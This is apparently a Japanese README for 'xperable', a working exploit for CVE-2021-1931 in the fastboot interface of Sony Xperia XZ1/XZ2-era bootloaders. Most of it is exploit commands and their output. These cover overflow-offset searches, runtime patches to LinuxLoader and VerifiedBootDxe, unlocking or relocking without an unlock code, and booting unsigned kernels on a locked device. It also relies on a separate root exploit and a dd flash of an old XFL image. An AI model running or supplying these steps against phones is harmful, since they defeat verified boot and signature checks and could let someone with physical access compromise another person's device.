xperable - Xperia ABL fastboot エクスプロイト
=============================================

xperable ツールは、Sony Yoshino および Tama プラットフォームの fastboot USB
インターフェースにおける CVE-2021-1931 Android Boot Loader 脆弱性を利用した
エクスプロイトです。Qualcomm Snapdragon 835 (MSM8998) および SDM845 チップセット
を搭載しています。対象デバイスには、Sony Xperia XZ Premium、Xperia XZ1、Xperia
XZ1 Compact（Yoshino プラットフォーム向けの各リージョン対応モデルを含む）が
含まれます。また、Sony Xperia XZ2 / XZ2 Compact / XZ2 Premium / XZ3（Tama
プラットフォーム向けの各リージョン対応モデルを含む）も対象です。

このエクスプロイトは fastboot 上で任意コードを実行し、Qualcomm Secondary
Bootloader（すなわち ABL (Android Boot Loader) を含む XBL (eXtensible Boot
Loader)）の非セキュアワールド RAM 領域への任意メモリアクセスを fastboot USB
インターフェース経由で提供します。読み取り専用セクションへの書き込みも可能です。


機能
----

現在利用可能な機能:

- ブートローダーアンロックコードなしでのアンロック（日本モデルのようにブートロー
  ダーの *アンロック不可* 設定のデバイスも含む）
- ブートローダーの再ロックによる純正ファームウェア状態への復元
- この方法でのアンロック/再ロックは Sony DRM デバイスキーを消去しない
- ブートローダーがロックされた状態での未署名カーネルの fastboot boot（Tama は
  作業中）
- スクリプト化可能なブートローダーランタイムパッチ実験用の柔軟なコマンドライン
  オプション

アンロック/再ロック時の Android ユーザーデータ消去もスキップされますが、ブート
ローダーアンロック状態が反転するため復号が失敗し、データにはアクセスできない
可能性が高く、あまり有用ではありません（android は起動せず、消去が必要）。

ただし、アンロックを行い 'fastboot boot' コマンドで USB 経由から任意の android
リカバリカーネルを起動し、その後 BL を再ロックして元のユーザーデータのままで
android を起動することは可能です。

ブートローダーがロックされた状態で fastboot から未署名カーネルをブートできる
ことにより、例えばルート化済み純正カーネルのブートや、復号のための認証付き
ユーザーデータアクセスを持つ android リカバリカーネルのブート、さらには BL が
ロックされた状態でのフルカスタム ROM のブートなどが可能になります。


制限事項
--------

エクスプロイトを使ってブートローダーを再ロックしても、Sony DRM デバイスキーが
魔法のように復元されるわけではありません。キーがすでに失われている場合、ブート
ローダーを再ロックしても純正ファームウェアでは DRM 保護機能は動作しません。

ハードウェアベースの認証は、``persist`` パーティションが無傷である場合（つまり
Sony 純正ファームウェアの「空」コンテンツで誤ってフラッシュされていない場合）
のみ、再ロック後に純正ファームウェアで動作するようになります。パーティションを
フラッシュすると認証キーが失われます。


コンパイル
----------

xperable ツールは主に Linux 向けに設計されていますが、Windows 向けにもコンパイル
できます。libusb-1.0 に依存しており、このプロジェクトの git サブモジュールとして
含まれる `pe-parse`_ ライブラリを使用します。

.. _pe-parse: https://github.com/trailofbits/pe-parse

このリポジトリをサブモジュールも含めて再帰的にクローンします:

::

  $ git clone --recursive https://github.com/j4nn/xperable.git

Linux では ``make`` でビルドします。pe-parse ライブラリのビルドのために
``cmake`` も必要です（本プロジェクトの Makefile から呼び出されます）。

Makefile には、make コマンドラインの ``CROSS_BUILD`` 変数を使って選択できる
クロスコンパイル用の追加ターゲットが含まれており、Makefile に記載された
クロスコンパイルツールチェーンが必要です。

このエクスプロイトは、fastboot ランタイムパッチのベースとして Yoshino
LinuxLoader UEFI モジュールが必要です。これは Sony 純正ファームウェアの
ブートローダーの ABL から抽出できます。そのために `uefi-firmware-parser`_ ツール
が必要です。抽出は必要に応じて Makefile から実行され、必要なファームウェアファイル
の入手方法と配置場所が表示されます。

.. _uefi-firmware-parser: https://github.com/theopolis/uefi-firmware-parser


Yoshino デバイスのセットアップ
------------------------------

このエクスプロイトは ``LA2_0_P_114`` ブートローダーを対象としていますが、動作
するために ``LA1_1_O_77`` バージョンの XFL が必要です。XFL は fastboot モードでは
直接使用されませんが、Sony がカスタマイズした ABL は何らかの理由で XFL の整合性を
検証し、ブートローダーのメモリレイアウトに影響します。
XFL は Sony フラッシュモード（緑色 LED ライト）を提供し、純正ファームウェアファイル
をフラッシュするための linux カーネルです。

新しいバージョンの XFL では、おそらく新しいブートローダーバージョンすべてで
より大きな XFL サイズのため、fastboot USB バッファを ABL コード領域にオーバーフロー
させることができません。そのため、root シェルから dd コマンドで ``xfl`` パーティ
ションに古い XFL を手動でフラッシュする必要があります。

ブートローダーがまだロックされている場合、Sony 純正 Android Oreo ファームウェア
向けの `bindershell`_ エクスプロイトを使用して一時的な root シェルを取得できます。
新しいファームウェアを使用している場合は、ユーザーデータの消去が必要なダウング
レードが必要なため、先に電話をバックアップする必要があります。
bindershell がサポートするファームウェアバージョンは `こちら`_ で確認してください。

.. _bindershell: https://github.com/j4nn/renoshell/tree/CVE-2019-2215
.. _こちら: https://github.com/j4nn/renoshell/blob/CVE-2019-2215/jni/offsets.c#L36

root シェルが取得できることを確認した後、使用している機種向けの最新純正ファーム
ウェアの ``boot`` サブディレクトリのみを使用して ``LA2_0_P_114`` ブートローダー
バージョンをフラッシュします（他はすべてスキップ）。

このプロジェクトのディレクトリで ``make boot/xfl-o77.mbn`` コマンドを実行して
古い XFL イメージを準備します。必要なファイルが不足している場合は、表示された
手順に従って取得してください。

``boot/xfl-o77.mbn`` ファイルを adb または SD カードで電話に転送し、root シェル
で以下のコマンドを実行して xfl パーティションにフラッシュします:

::

  # dd if=/sdcard/xfl-o77.mbn of=/dev/block/bootdevice/by-name/xfl

ファイルのコピー先によって ``if=`` オプションの xfl-o77.mbn の場所を調整する
必要がある場合があります。電話を再起動する前に ``sync`` コマンドも実行すると
より安全です。


Tama デバイスのセットアップ
----------------------------

このエクスプロイトは XZ2 / XZ3 デバイスの ``LA2_0_P_118`` ブートローダーを
対象としています。このバージョンのブートローダーは、日本モデルの最新純正
ファームウェアバージョンに搭載されています。

国際版 Tama デバイスは最新ファームウェアバージョンに新しいブートローダーが
搭載されているため、エクスプロイトを使用するためにダウングレードが必要な場合
があります。他はすべてスキップして、52.0.A.8.50 純正 fw バージョンの ``boot``
サブディレクトリのみをフラッシュしてください。


コマンドラインオプション
------------------------

xperable ツールは以下のコマンドラインオプションを解釈し、表示された順番に
即座に実行します。これによりブートローダーランタイムパッチスクリプトを
作成できます。

::

  $ ./xperable -h

  xperable - Xperia ABL fastboot エクスプロイト
  (  https://github.com/j4nn/xperable  )

  使用法: ./xperable [-h] [-v] [-q] [-V] [-Q] [-A] [-B] [-U]
                    [-b maxsize] [-t timeout] [-o offset] [-s size]
                    [-c command] [-x] [-0] [-1] [-2] [-3] [-4]
                    [-5] [-6] [-7] [-8] [-9] [-C cmdline]
                    [-l] [-m] [-a addr] [-M module]
                    [-r] [-O file] [-I file] [-w]
                    [-P file] [-p patch]

    -h            このヘルプを表示して終了
    -v            fastboot USB通信の詳細出力を増やす
    -q            fastboot USB通信の詳細出力を減らす
    -V            エクスプロイト自体の詳細出力を増やす
    -Q            エクスプロイトの詳細出力を減らす
    -A            フィルタ出力で 'fastboot getvar all' を実行
    -B            'fastboot getvar version-bootloader' コマンドを実行
    -U            'fastboot getvar unknown' コマンドを実行
    -b maxsize    全転送で使用するUSBチャンク最大サイズを設定
    -t timeout    USB転送タイムアウトをミリ秒で設定（デフォルト: 5000）
    -o offset     エクスプロイトテストケースで使用するオフセットを設定
    -s size       他のオプションで使用するサイズを設定
    -c command    fastbootコマンド文字列を設定
    -x            ABLパッチの拡張版を使用
    -0            ABL LinuxLoaderをクラッシュさせる基本テストケース
    -1            設定済みfastbootコマンドを実行
    -2            コードヒットまでのバッファオフセット距離を返す試み
    -3            -2オプションと同様だが代替手法を使用
    -4            ABL LinuxLoader完全パッチエクスプロイトを実行
    -5            -4オプションと同様だが代替手法を使用
    -6            VerifiedBootDxeの署名検証をパッチ
    -7            kcmdlineで 'green' -> 'orange' による偽アンロック
    -8            ブートコマンドを2つのカーネルイメージ使用にパッチ
    -9            パッチレベルオーバーライドのテスト（実験的）
    -l            RAMからブートローダーログを読み出し（-4/-5が先に必要）
    -m            XBL UEFIモジュールをベースアドレス付きで一覧表示
    -a addr       BL RAMの読み書きオプションで使用するアドレスを設定
    -M module     UEFIモジュールのベースアドレスをRAM読み書きアドレスに設定
    -r            BL内の 'addr' から 'size' バイトを読み出し
    -O file       ツールバッファから 'size' バイトを 'file' に書き込み
    -I file       'file' をツールバッファに読み込み 'size' も設定
    -w            BL内の 'addr' に 'size' バイトを書き込み
    -P file       PEファイルをツールバッファに読み込みリロケーション実行
                  'addr' ベースに設定、'size' をコード境界に設定、
                  LinuxLoaderファイル名の場合は-4/-5パッチを適用
    -p patch      指定した 'patch' シーケンスをツールバッファに適用

  'patch' はコンマで区切られた1つ以上の 'subpatch' で構成
  'subpatch' は ':/%@' のいずれかで区切られた 'hexoffs' と 'patchseq' のペア
  それぞれの文字は 'patchseq' 各要素のサイズまたは形式を指定
  'patchseq' はコンマで区切られた16進値のリスト

  'hexoffs' と 'patchseq' 区切り文字の意味:
    :             'patchseq' の16進値はバイト値
    /             'patchseq' の16進値は32ビット値
    %             'patchseq' の16進値はバイトスワップされる32ビット値
    @             'patchseq' の16進値は64ビット値


使用例
------

**Xperia XZ1 Compact (G8441)** でテストする場合、エクスプロイトのデフォルト
プリセットをそのまま使用できます:

::

  $ ./xperable -B -U -4
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [+] test4 開始 size = 0xf3f880, offset = 0x30, payloadsize = 0xe7000
  [+] LinuxLoader ベースアドレス取得 0x98dc0000 (0xa9ed1111)
  [+] LinuxLoader @ 0x98dc0000 パッチ適用成功 (USB バッファ @ 0x97e85000, distance = 0x00f3b000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] ログバッファ出力, logbuf_pos = 0x0000, length = 0x24ca:
  UEFI Ver    : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
  Build Info  : 64b Jul 23 2019 16:44:00
  UEFI Ver   : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
  Loader Build Info: Jul 23 2019 16:47:39
  XBOOT (1306-5035_X_Boot_MSM8998_LA2.0_P_114)
  Fastboot Build Info: Jul 23 2019 16:47:34

上記の ``-4`` が成功した後、以下の方法でブートローダーをアンロック（Y）または
再ロック（X）できます:

::

  $ ./xperable -c "oem unlock Y" -1 -c reboot -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock Y'
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

  $ ./xperable -c "oem unlock X" -1 -c reboot -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock X'
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

以下の例は **Xperia XZ1 Dual SIM (G8342)** でのテストを示しています。
USB バッファオーバーフローで fastboot を完全にハングさせる無限ループに
コード実行を持ち込めるか試します。

::

  $ ./xperable -v -V -B -U -s 0xfff000 -0
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] p114 xperableターゲットを使用 (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] test0 開始 size = 0x00fff000, offset = 0x00000030, cmd = 'download:00000010'
    00000000-0000002c: [ 00 00 40 94 ]
    00000030-00ffeffc: [ 00 00 00 14 ]
        {00fff000->00fff000:OK} "download:00000010.@...@...@...@...@...@...@...@................."
        {00000040<-00000000:TO} ""
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
        {00000011->00000011:OK} "download:00000010"
        {00000040<-00000000:TO} ""
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
  [.] test0 完了: res = -1

  $ ./xperable -c reboot-bootloader -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd 送信失敗: reqsz=0x11 res=0xffffffff
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd 送信失敗: reqsz=0x11 res=0xffffffff

``reboot-bootloader`` fastboot コマンドに応答しないことで、コード実行によるハング
がほぼ確認できます。電源ボタンと Vol+ を同時押しして強制再起動し、その後 Vol+ のみ
を押し続けて fastboot に戻ります。

テストケース ``-2`` で動作するバッファオーバーフローサイズを探します。
二分探索で範囲を絞り込めます。

::

  $ ./xperable -v -V -B -U -s 0xf30080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] p114 xperableターゲットを使用 (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] test2 開始 size = 0xf30080, offset = 0x30, cmd = 'download:00000010'
        {00f30080->00f30080:OK} "download:00000010..............................................."
        {00000040<-0000000d:OK} "DATA00000010."
        {00000010->00000010:OK} "AAAAAAAAAAAAAAAA"
        {00000040<-00000004:OK} "OKAY"
  [+] test2 未ヒット: レスポンス = ''

  $ ./xperable -c reboot-bootloader -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

ヒットしなかったので、より大きいサイズで試します:

::

  $ ./xperable -v -V -B -U -s 0xf60080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] p114 xperableターゲットを使用 (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] test2 開始 size = 0xf60080, offset = 0x30, cmd = 'download:00000010'
        {00f60080->00f60080:OK} "download:00000010..............................................."
        {00000040<-00000000:IO} ""
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
        {00000011->00000000:IO} ""
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd 送信失敗: reqsz=0x11 res=0xffffffff
  [!] test2 失敗: レスポンス = ''

クラッシュして再起動しました。すぐに Vol+ を押し続けて fastboot モードに戻ります。
中間のサイズでもう一度試します:

::

  $ ./xperable -v -V -B -U -s 0xf48080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] p114 xperableターゲットを使用 (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] test2 開始 size = 0xf48080, offset = 0x30, cmd = 'download:00000010'
        {00f48080->00f48080:OK} "download:00000010..............................................."
        {00000040<-00000012:OK} "f46eb0-vxyzf46eb0-"
  [+] test2 成功: distance = 0xf46eb0 + 0x00 (offset was 0x30)

  $ ./xperable -c reboot-bootloader -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

報告された distance に 0x29d0 を加算し、そのサイズを ``-4`` テストケースに使用
します:

::

  $ ./xperable -v -V -B -U -s 0xf49880 -4
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] p114 xperableターゲットを使用 (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [.] LinuxLoader-p114.pe のコード境界: 0x000e7000
  [+] test4 開始 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
        {00f49880->00f49880:OK} "download:000e7010...................................@u@.N5O)...."
        {00000040<-0000000d:OK} "DATA........."
  [+] LinuxLoader ベースアドレス取得 0x98dbe000 (0xa9ecf111)
        {000e7000->000e7000:OK} "MZ..........................................................X..."
        {00000040<-00000004:OK} "OKAY"
        {00000008->00000008:OK} "flash:fb"
        {00000040<-00000017:OK} "FAIL98DBE000/97E79000.."
  [+] LinuxLoader @ 0x98dbe000 パッチ適用成功 (USB バッファ @ 0x97e79000, distance = 0x00f45000)

ブートローダーがロックされている場合、``fastboot boot`` コマンドは許可されません。
確認してみましょう:

::

  $ ./xperable -A
  unlocked:no
  version-baseband:1307-7471_47.2.A.11.228
  version-bootloader:1306-5035_X_Boot_MSM8998_LA2.0_P_114
  secure:yes
  product:G8342

  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
        {00000011->00000011:OK} "download:025f4000"
        {00000040<-0000000d:OK} "DATA025f4000."
        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
        {00000040<-00000004:OK} "OKAY"
  [.] test1 完了: res = 0
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
        {00000004->00000004:OK} "boot"
        {00000040<-00000017:OK} "FAILCommand not allowed"
  Command not allowed
  [.] test1 完了: res = 1

ランタイムパッチを適用して（``-4`` 成功状態で）、``fastboot boot`` を再度テスト
します:

::

  $ ./xperable -M LinuxLoader -P LinuxLoader-p114.pe -p 286DC%1f2003d5 -w
  [+] LinuxLoader-p114.pe を読み込み (res=1052672, size=946176), LinuxLoader パッチを適用

  $ ./xperable -M VerifiedBootDxe -s 0xc000 -r -p 25FC%3d000014 -w

  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
        {00000011->00000011:OK} "download:025f4000"
        {00000040<-0000000d:OK} "DATA025f4000."
        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
        {00000040<-00000004:OK} "OKAY"
  [.] test1 完了: res = 0
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
        {00000004->00000004:OK} "boot"
        {00000040<-00000004:OK} "OKAY"
  [.] test1 完了: res = 0

ブートローダーがロックされた状態で未署名の android カーネルが起動しました。
上記のブートローダーロック状態で ``fastboot boot`` を許可するパッチはすでに
エクスプロイトに統合されており、``-4`` 実行時に ``-x`` オプションで有効化できます。
イメージ署名検証をスキップするための VerifiedBootDxe のパッチは ``-6`` テスト
ケースで実装されています。その後 fastboot から未署名カーネルをすぐに起動できます:

::

  $ ./xperable -c reboot-bootloader -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

  $ ./xperable -B -U -s 0xf49880 -x -4 -6
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [+] test4 開始 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
  [+] LinuxLoader ベースアドレス取得 0x98db9000 (0xa9eca111)
  [+] LinuxLoader @ 0x98db9000 パッチ適用成功 (USB バッファ @ 0x97e74000, distance = 0x00f45000)
  [+] test6 開始
  [+] VerifiedBootDxe @ 0x9b2f0000 パッチ適用成功

  $ ./xperable -I twrp-poplar.img -1 -c boot -1
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
  [+] test1 開始 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'



**Xperia XZ2 (H8266)** でテストする場合、エクスプロイトのデフォルトプリセットを
そのまま使用できます:

::

  $ ./xperable -B -U -5
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test5 開始 size = 0x400f90, offset = 0x2a7000, payloadsize = 0xfb000
  [+] LinuxLoader ベースアドレス取得 0x988c1000 (0x988f3278)
  [+] LinuxLoader @ 0x988c1000 パッチ適用成功 (USB バッファ @ 0x984c7000, distance = 0x003fa000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] ログバッファ出力, logbuf_pos = 0x0000, length = 0x3354:
  S - QC_IMAGE_VERSION_STRING=BOOT.XF.2.0-00364-SDM845LZB-1
  UEFI Ver    : 5.0.180827.BOOT.XF.2.0-00364-SDM845LZB-1
  Build Info  : 64b Aug 27 2018 18:24:43
  Loader Build Info: Aug 27 2018 18:27:12
  XBOOT (1310-7079_X_Boot_SDM845_LA2.0_P_118)
  Fastboot Build Info: Aug 27 2018 18:27:10

上記の ``-5`` が成功した後、以下の方法でブートローダーをアンロック（Y）または
再ロック（X）できます:

::

  $ ./xperable -c "oem unlock Y" -1 -c reboot -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock Y'
  Device already unlocked
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

XZ2 がすでにアンロックされている場合、デフォルトのエクスプロイト設定が動作しなく
なります。メモリレイアウトが異なる方法でランダム化されているようです。ブートローダー
を再ロックしたい場合は、新しいヒットオフセット範囲を探す必要があります。

::

  $ ./xperable -B -U -s 0xfff000 -0
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test0 開始 size = 0x00fff000, offset = 0x002a7000, cmd = 'download:00000010'
    00000000-002a6ffc: [ 00 00 40 94 ]
    002a7000-00ffeffc: [ 00 00 00 14 ]
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
  [!] libusb_bulk_transfer 失敗: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)

上記のように fastboot がハングしている場合、コード実行がほぼ確認されます。
テストケース ``-3`` で動作するバッファオーバーフローサイズを探します。
二分探索で範囲を絞り込めます。

::

  $ ./xperable -B -U -s 0xb00f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test3 開始 size = 0xb00f90, offset = 0x2a7000, cmd = 'download:00000010'
  [+] test3 未ヒット: レスポンス = ''

オーバーフローサイズが不足しています。次はより大きなサイズで試します。

::

  $ ./xperable -B -U -s 0xc00f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test3 開始 size = 0xc00f90, offset = 0x2a7000, cmd = 'download:00000010'
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd 送信失敗: reqsz=0x11 res=0xffffffff
  [!] test3 失敗: レスポンス = ''

再起動しました。コード実行ヒットと仮定して二分探索でエクスプロイトヒット範囲を
絞り込みます。

::

  $ ./xperable -B -U -s 0xb80f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test3 開始 size = 0xb80f90, offset = 0x2a7000, cmd = 'download:00000010'
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp 受信失敗 (rspsz=0x0040)
  [!] libusb_bulk_transfer 失敗: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd 送信失敗: reqsz=0x11 res=0xffffffff
  [!] test3 失敗: レスポンス = ''

  $ ./xperable -B -U -s 0xb40f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test3 開始 size = 0xb40f90, offset = 0x2a7000, cmd = 'download:00000010'
  [+] test3 成功: distance = 0xb23c00, hit from 0x032274, base = 0x988b9000 (offset=0x2a7000 size=0xb40f90)

動作する試行が得られました。ブートローダーを再ロックします。
成功した ``-3`` の後に fastboot に再起動します（強制リセットが必要な場合があります）。

::

  $ ./xperable -B -U -s 0xb40f90 -5
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] test5 開始 size = 0xb40f90, offset = 0x2a7000, payloadsize = 0xfb000
  [+] LinuxLoader ベースアドレス取得 0x988bb000 (0x988ed278)
  [+] LinuxLoader @ 0x988bb000 パッチ適用成功 (USB バッファ @ 0x97d91000, distance = 0x00b2a000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] ログバッファ出力, logbuf_pos = 0x0000, length = 0x3437:
  S - QC_IMAGE_VERSION_STRING=BOOT.XF.2.0-00364-SDM845LZB-1
  UEFI Ver    : 5.0.180827.BOOT.XF.2.0-00364-SDM845LZB-1
  Build Info  : 64b Aug 27 2018 18:24:43
  Loader Build Info: Aug 27 2018 18:27:12
  XBOOT (1310-7079_X_Boot_SDM845_LA2.0_P_118)
  Fastboot Build Info: Aug 27 2018 18:27:10

  $ ./xperable -c "oem unlock X" -1 -c reboot -1
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock X'
  Device already unlocked
  [+] test1 開始 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

「Device already unlocked」というメッセージが表示されますが、エクスプロイトは
実際に動作しており、ブートローダーは再ロックされています:

::

  $ ./xperable -A
  unlocked:no
  version-baseband:1311-7920_52.1.A.3.49
  version-bootloader:1310-7079_X_Boot_SDM845_LA2.0_P_118
  secure:yes
  product:H8266


ロックされた XZ2 で twrp をブートしようとすると、exploited fastboot の状態が
十分に安定していないか、実装すべきバグや不足があるようで、今のところほとんどの
場合失敗します。これは現在も作業中です。ただし、twrp が正常にブートできた
ケースが1件ありました。

.. raw:: html

   <details>
   <summary><a>2カーネルエクスプロイトバリアント</a></summary>

.. code-block::

   $ ./xperable -v -v -V -V -B -U -x -x -x -5 -I boot_X-FLASH-ALL-B6B5.img -c twrp-akari.img -8
         {00000019->00000019:OK} 67 65 74 76 61 72 3a 76 65 72 73 69 6f 6e 2d 62 "getvar:version-bootloader"
         {00000040<-00000027:OK} 4f 4b 41 59 31 33 31 30 2d 37 30 37 39 5f 58 5f "OKAY1310-7079_X_Boot_SDM845_LA2.0_P_118"
   version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
   [.] p118 xperableターゲットを使用 (offset = 0x2a7000, size = 0x400f90)
         {0000000e->0000000e:OK} 67 65 74 76 61 72 3a 75 6e 6b 6e 6f 77 6e       "getvar:unknown"
         {00000040<-0000001d:OK} 46 41 49 4c 47 65 74 56 61 72 20 56 61 72 69 61 "FAILGetVar Variable Not found"
   [.] LinuxLoader-p118.pe のコード境界: 0x000fb000
   [+] test5 開始 size = 0x400f90, offset = 0x2a7000, payloadsize = 0xfb000
         {00400f90->00400f90:OK} 64 6f 77 6e 6c 6f 61 64 3a 30 30 30 66 62 30 31 "download:000fb010..............................................."
         {00000040<-0000000d:OK} 44 41 54 41 78 e2 8e 98 00 00 00 00 00          "DATAx........"
   [+] LinuxLoader ベースアドレス取得 0x988bc000 (0x988ee278)
         {000fb000->000fb000:OK} 4d 5a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "MZ..........................................................X..."
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
         {00000008->00000008:OK} 66 6c 61 73 68 3a 66 62                         "flash:fb"
         {00000040<-00000017:OK} 46 41 49 4c 39 38 38 42 43 30 30 30 2f 39 38 34 "FAIL988BC000/984C5000.."
   [+] LinuxLoader @ 0x988bc000 パッチ適用成功 (USB バッファ @ 0x984c5000, distance = 0x003f7000)
   [+] test8 開始
   [.] LinuxLoader-p118.pe のコード境界: 0x000fb000
   [+] LinuxLoader @ 0x988bc000 test8 用パッチ適用済み
         {00000011->00000011:OK} 64 6f 77 6e 6c 6f 61 64 3a 30 36 62 35 61 30 31 "download:06b5a010"
         {00000040<-0000000d:OK} 44 41 54 41 30 36 62 35 61 30 31 30 00          "DATA06b5a010."
         {01000000->01000000:OK} 41 4e 44 52 4f 49 44 21 47 ef e5 00 00 80 00 00 "ANDROID!G...................................G..................."
         {01000000->01000000:OK} 4d ae 7d 7f 8f 38 b9 18 72 7c 6e f9 3f 99 d8 3b "M.}..8..r|n.?..;yh-....`...:jm......C..W.......m......o.n......."
         {01000000->01000000:OK} 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "................................................................"
         {01000000->01000000:OK} 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "................................................................"
         {01000000->01000000:OK} 00 a0 b5 02 00 00 00 00 41 4e 44 52 4f 49 44 21 "........ANDROID!C.......8...........................<&]........."
         {01000000->01000000:OK} 8a 11 cf 16 ea 12 c1 d9 85 f2 ba f1 7a 65 51 7c "............zeQ|Z%*M7^.,.....hX....1j..0.W..'y;....Xu...A!N.T.^."
